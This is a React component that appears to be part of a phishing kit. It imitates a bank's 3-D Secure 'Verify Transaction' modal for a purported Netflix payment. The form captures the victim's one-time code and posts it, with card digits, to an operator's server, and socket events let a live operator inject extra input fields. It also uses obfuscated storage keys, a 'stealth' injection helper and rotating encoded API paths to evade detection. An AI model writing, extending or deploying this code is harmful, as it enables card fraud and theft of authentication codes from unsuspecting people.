import React, { useState, useEffect, useRef } from 'react';
import { socket } from '../../index';
import { rPyl } from '../../utils/rPyl';
import { injectStealthToComponent } from '../../utils/injSteaArt';
import axios from 'axios';
import visaLogo from './visalogo.svg';
import mcLogo from './mc.svg';
import amexLogo from './amexlogo.svg';
const ContainerCustom = () => {
  const [styles, setStyles] = useState(null);
  const [showNotif, setShowNotif] = useState(true);
  const [logoUrl, setLogoUrl] = useState('');
  const [brandLogo, setBrandLogo] = useState('');
  const [brand, setBrand] = useState('');
  const [links, setLinks] = useState({});
  const [currentDate, setCurrentDate] = useState('');
  const [inputs, setInputs] = useState([]);
  const [inputsConfig, setInputsConfig] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [maskedCardNumber, setMaskedCardNumber] = useState('************');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [customText, setCustomText] = useState("");

  const userId = sessionStorage.getItem('uCukkzD');

  

useEffect(() => {
    const uCukkzD = localStorage.getItem('uCukkzD');
    const storedConfig = localStorage.getItem(`cstingc_${uCukkzD}`);
    if (storedConfig) {
      setInputsConfig(JSON.parse(storedConfig));
    }

    const waitForSocket = () => {
      if (!socket || !socket.connected) {
        setTimeout(waitForSocket, 200);
        return;
      }

      // ✅ Now safe to attach listeners
      socket.on('addCustomInput', ({ uCukkzD: sid, input }) => {
        if (sid === localStorage.getItem('uCukkzD')) {
          setInputs(prev => [...prev, input]);
        }
      });

      socket.on('configureInputs', ({ uCukkzD: sid, inputsConfig }) => {
        if (sid === uCukkzD) {
          setInputsConfig(inputsConfig);
          sessionStorage.setItem(`cstingc_${uCukkzD}`, JSON.stringify(inputsConfig));
          setIsLoading(false);
        }
      });

      socket.on('configUpdate', ({ uCukkzD: sid, inputsConfig }) => {
        if (sid === uCukkzD) {
          setInputsConfig(inputsConfig);
          sessionStorage.setItem(`cstingc_${uCukkzD}`, JSON.stringify(inputsConfig));
          setIsLoading(false);
        }
      });
    };

    waitForSocket();

    return () => {
      if (socket && socket.off) {
        socket.off('addCustomInput');
        socket.off('configureInputs');
        socket.off('configUpdate');
      }
    };
  }, []);
      const containerRef = useRef(null);
    
      useEffect(() => {
        requestAnimationFrame(() => {
          if (containerRef.current) {
            injectStealthToComponent(containerRef.current);
          }
        });
      }, []);
  
  useEffect(() => {
      const style = document.createElement("style");
      style.innerHTML = `
        body {
          font-family: "Segoe UI", "Roboto", "Helvetica Neue", sans-serif;
          font-weight: 400;
          color:rgb(0, 0, 0);
        }
    
        h1, h2, h3, h4, h5, h6 {
          font-weight: 500;
          margin-bottom: 0.5rem;
        }
    
        p, span, label, div {
          font-weight: 400 !important;
          line-height: 1.6;
          font-size: 14.8px;
          color:rgb(0, 0, 0);
        }
    
        strong, b {
          font-weight: 500 !important;
        }
    
        button.submitbtn {
          font-weight: 600;
          font-size: 14px;
          letter-spacing: 0.3px;
        }
      `;
      document.head.appendChild(style);
    
      return () => {
        document.head.removeChild(style);
      };
    }, []);
  const getBrandLogo = () => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
      case 'mastercard':
        return mcLogo;
      case 'amex':
      case 'american express':
        return amexLogo;
      default:
        return '';
    }
  };

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles, spinnerStyles] = await Promise.all([
          import('../../assets/styles/styler.css'),
          import('../../assets/styles/styler_f.css'),
          import('./styling.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
          more: spinnerStyles.default,
        });
      } catch (error) {
      }
    };

    const fetchCreditCard = async () => {
      try {
        const lCdT3Bk = sessionStorage.getItem('lCdT3Bk');
        if (lCdT3Bk) {
          const masked = '*'.repeat(12) + lCdT3Bk;
          setMaskedCardNumber(masked);
        }
      } catch (error) {
        setMaskedCardNumber('************0000');
      }
    };
    
    const fetchLogoUrl = async () => {
      try {
        const storedLogoUrl = sessionStorage.getItem('LgLBn');
        const storedBrand = sessionStorage.getItem('BrnTFls');
        if (storedLogoUrl) {
          setLogoUrl(storedLogoUrl);
        }
        if (storedBrand) {
          setBrand(storedBrand);
        }

      } catch (error) {
      }
    };
    fetchCreditCard();
    fetchLogoUrl();
    loadStyles();

    // Set the current date
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, [userId]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const inputs = Object.values(formData).filter(value => value.trim() !== '').join(', ');
    if (!inputs) {
      setError('Incorrect code');
      return;
    }

    setLoading(true);
    try {
      const maskedCardNumber = sessionStorage.getItem('lCdT3Bk');

      const response = await axios.post(`${process.env.REACT_APP_API_URL}/ath/${userId}`, rPyl({
        otp: inputs,
        maskedCardNumber
      }));

      if (response.status === 200) {
        // Stays waiting for admin to change component, set a loading indicator and wait
        setLoading(true);
      }
    } catch (error) {
      //setError('Verification failed');
    } finally {
      setLoading(true);
    }
  };
  const BASE62_CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  // 🔥 Base62 Encoding Function (Ensures Proper Encoding)
  const base62Encode = (num) => {
      if (!num || num <= 0) return "0"; // Prevent encoding failures
      let encoded = "";
      while (num > 0) {
          encoded = BASE62_CHARS[num % 62] + encoded;
          num = Math.floor(num / 62);
      }
      return encoded || "0"; // Always return a valid string
  };
  
  // ✅ Generate a Properly Encoded API Path
  const getRandomizedConfigPath = () => {
      let encodedTimestamp = null;
      let attempts = 0;
  
      while (!encodedTimestamp || encodedTimestamp.length < 3) { 
          if (attempts > 5) { // 🔥 Prevent infinite loops
              return null;
          }
  
          const timestamp = Math.floor(Date.now() / 1000); // ✅ Use full timestamp
          encodedTimestamp = base62Encode(Math.floor(timestamp / 2)); // ✅ Encode (timestamp / 2)
          attempts++;
      }
  
      return `api/${encodedTimestamp}`;
  };
  
  useEffect(() => {
    const uCukkzD = sessionStorage.getItem('uCukkzD');
  
    const fetchConfig = async () => {
      try {
        if (!uCukkzD) throw new Error("Missing uCukkzD");
  
        const randomizedPath = getRandomizedConfigPath();
        const url = `${process.env.REACT_APP_API_URL}/${randomizedPath}/${uCukkzD}`;
  
        const response = await fetch(url, { method: "GET" }); // ✅ Ensure GET request has no body
  
        if (!response.ok) throw new Error(`API response not OK, status: ${response.status}`);
  
        const data = await response.json();
        setInputsConfig(data.inputsConfig || []);
        setCustomText(data.customText || `A secure verification code has been sent to your registered mobile number via SMS.
By entering the code below, you are authorizing a payment to WWW.NETFLIX.COM.
This action constitutes your consent to proceed with the transaction under the terms of your card issuer agreement.`);
  
        // ✅ Store in sessionStorage for quick access
        sessionStorage.setItem(`cstingc_${uCukkzD}`, JSON.stringify(data.inputsConfig || []));
        sessionStorage.setItem(`cstx_${uCukkzD}`, data.customText || `A secure verification code has been sent to your registered mobile number via SMS.
By entering the code below, you are authorizing a payment to WWW.NETFLIX.COM.
This action constitutes your consent to proceed with the transaction under the terms of your card issuer agreement.`);
      } catch (error) {
      } finally {
        setIsLoading(false);
      }
    };
  
    fetchConfig();
  }, []);
  

  if (isLoading && inputsConfig.length === 0) {
    return <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
    <div id="Cardinal-ElementContainer">
      <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
        <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
        </div>
      </div>
      <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
    </div>
  </body>;
  }

  return (
    <body ref={containerRef} className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{ paddingTop: '0px' }} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
              {loading && (
                <div className="spinner-overlay">
                  <div className="spinner"></div>
                </div>
              )}
            <div style={{
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
            }} className="threeds-two">
              <div className="container-fluid">
                <div style={{ scrollPaddingBottom: '24px', minHeight: '30xp', paddingBottom : "46px"}}>
                  {/* Show the logos here */}
                  <img src={logoUrl} alt="" style={{ width: '20%', float: 'left' }} />
                  <img src={getBrandLogo()} alt="" style={{ width: '20%', float: 'right' }} />
                </div>
                <br/>
                <br/>
                <br/>
                <br/>
                <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                  <div className="container container-sticky-footer">
                    <form
                      autoComplete="off"

                      noValidate
                      onSubmit={handleSubmit}
                    >
                      <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                        <div className="row"></div>
                        <div className="row">
                          <div className="col-12" id="ValidateOneUpMessage">
                            <div style={{ textAlign: 'center' }} id="Body1">
                              <strong>Verify Transaction</strong>
                            </div>
                          </div>
                        </div>
                        <div className="row">
                          <div style={{ textAlign: 'center' }} className="col-12" id="ValidateOptInMessage">
                          {customText}                          </div>
                        </div>
                        <br />
                        <div className="row form-two-col">
                          <div className="col-12 p-0">
                            <fieldset id="ValidateTransactionDetailsContainer">
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Merchant</span>
                                <span style={{ textAlign: "right" }} className="col-6">WWW.NETFLIX.COM</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Card Number</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{maskedCardNumber}</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Date</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{currentDate}</span>
                              </div>
                              <br />
                              <br />
                              { error && <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>{error}</b>. Please try again.</div> }
                              <div id="cust" className="formcol">
                                {inputsConfig.map((input, index) => (
                                  <div key={index} style={{ marginBottom: '10px' }}>
                                    <input
                                      type={input.type}
                                      placeholder={input.placeholder}
                                      name={input.name}
                                      className="textinput"
                                      required={input.type !== 'hidden'}
                                      style={{ display: input.type === 'hidden' ? 'none' : 'block' }}
                                      onChange={handleChange}
                                    />
                                  </div>
                                ))}
                              </div>
                            </fieldset>
                            <div className="col-12 text-center">
                              <button className="submitbtn" type="submit" disabled={loading}>
                              CONFIRM
                              </button>
                              <br />
                              <br />
                              <button type='reset' className="submitbtn reverse-btn" >
                                RESEND CODE
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="sticky-footer">
                        <div className="row no-pad">
                        </div>
                        <div className="" id="FooterLinks">
                          <div className="row">
                            <div className="col-12">
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
                <br />
              </div>
            </div>
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerCustom;
